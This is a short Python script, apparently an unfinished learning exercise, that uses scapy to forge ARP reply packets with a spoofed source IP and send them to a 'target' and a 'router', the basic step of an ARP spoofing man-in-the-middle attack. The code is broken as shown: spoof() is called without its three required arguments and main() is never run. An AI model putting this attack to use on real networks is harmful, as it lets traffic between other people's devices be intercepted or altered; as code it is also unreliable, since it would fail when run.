#!/usr/bin/env python

import scapy.all as scapy


def spoof(destination_IP, faked_IP, user_MAC):
    packet = scapy.ARP(op=2, pdst=destination_IP, hwdst=user_MAC, psrc=faked_IP)
    return packet


def main():
    packet_for_target = spoof()
    packet_for_router = spoof()

    scapy.send(packet_for_target)
    scapy.send(packet_for_router)
